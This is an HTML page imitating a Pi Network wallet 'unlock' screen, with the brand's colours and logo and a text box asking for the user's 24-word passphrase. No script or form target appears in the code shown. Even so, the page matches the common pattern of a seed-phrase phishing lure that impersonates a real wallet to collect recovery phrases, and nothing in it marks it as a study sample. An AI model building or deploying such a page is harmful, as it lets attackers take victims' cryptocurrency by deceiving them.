<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            text-align: center;
        }
        .header {
            background-color: #6A329F;
            color: white;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header img {
            height: 30px;
        }
        .header span {
            font-size: 18px;
        }
        .container {
            margin: 40px auto;
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        textarea {
            width: calc(100% - 20px);
            height: 120px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
        }
        .btn {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            background-color: #6A329F;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .info {
            font-size: 14px;
            color: gray;
            margin-top: 20px;
        }
        @media (max-width: 600px) {
            .header {
                padding: 10px;
            }
            .header span {
                font-size: 16px;
            }
            .container {
                width: 95%;
                padding: 15px;
            }
            textarea {
                font-size: 14px;
                padding: 8px;
            }
            .btn {
                font-size: 14px;
                padding: 12px;
            }
            .info {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <span>&larr;</span>
        <span>Wallet</span>
        <img src="pi-logo.jpg" >
    </div>
    <div class="container">
        <h2>Unlock Pi Wallet</h2>
        <textarea placeholder="Enter your 24-word passphrase here"></textarea>
        <button class="btn">Unlock With Passphrase</button>
        <button class="btn btn-disabled" disabled>Biometric Not Available</button>
        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
    </div>
</body>
</html>
